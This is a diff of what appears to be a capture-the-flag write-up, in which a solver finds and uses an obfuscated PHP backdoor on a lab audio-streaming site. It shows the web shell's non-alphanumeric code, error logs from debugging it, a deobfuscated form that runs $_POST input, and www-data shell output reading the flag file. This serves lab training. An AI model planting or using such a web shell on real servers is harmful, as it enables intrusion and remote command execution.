@@ -6,23 +6,8 @@
 
 ```
 Someone keeps hacking my audio streaming website and I don't know how! I think they left a backdoor or something! Can you take a look at it?
-```
-
-
-
-```
 Did you find anything interesting yet? Is there a feature you can leverage to read the server-side code?
-```
-
-
-
-```
 Now that you can read the server-side code, did you find any backdoor injected in them? If the answer is yes, try using that backdoor to read the flag located at the '/' directory!
-```
-
-
-
-```
 <?php $_=``.[];
 $__=@$_;
 $_= $__[0];
@@ -42,42 +27,19 @@ $_2 = ++$_;
  $_ = $_2.$_1.$_2.$_0;
  $_($$_55[_]);
 ?>
-```
-
-
-
-```
-127.0.0.1:26423 [500]: GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /root/backdoor.php:1
+127.0.0.1:
+26423 [500]: GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /root/backdoor.php:1
 Stack trace:
 #0 /root/backdoor.php(1): shell_exec()
 #1 {main}
  thrown in /root/backdoor.php on line 1
-```
-
-
-
-```
 <?php $_=``.[];
-```
-
-
-
-```
-127.0.0.1:26724 [500]: GET /backdoor.php - Uncaught Error: Call to undefined function yjyw() in /root/backdoor.php:18
+127.0.0.1:
+26724 [500]: GET /backdoor.php - Uncaught Error: Call to undefined function yjyw() in /root/backdoor.php:18
 Stack trace:
 #0 {main}
  thrown in /root/backdoor.php on line 18
-```
-
-
-
-```
 $_($$_55[_]);
-```
-
-
-
-```
 <?php $_=`id`.[];
 $__=@$_;
 $_= $__[0];
@@ -92,17 +54,7 @@ echo $_55;
  $_ = $_2.$_1.$_2.$_0;
  //$_($$_55[_]);
 ?>
-```
-
-
-
-```
 $_($_POST[_])
-```
-
-
-
-```
 www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ id
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -132,6 +84,6 @@ www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ id
  drwxr-xr-x 1 root root 4096 Nov 14 2022 usr
  drwxr-xr-x 1 root root 4096 Nov 15 2022 var
  www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ cat flag_3_7764865c46bfce2c138e77ae5407354e.txt
- <w$ cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt 
+ <w$ cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt
  flag{p3rs1s<snip>32}
 ```
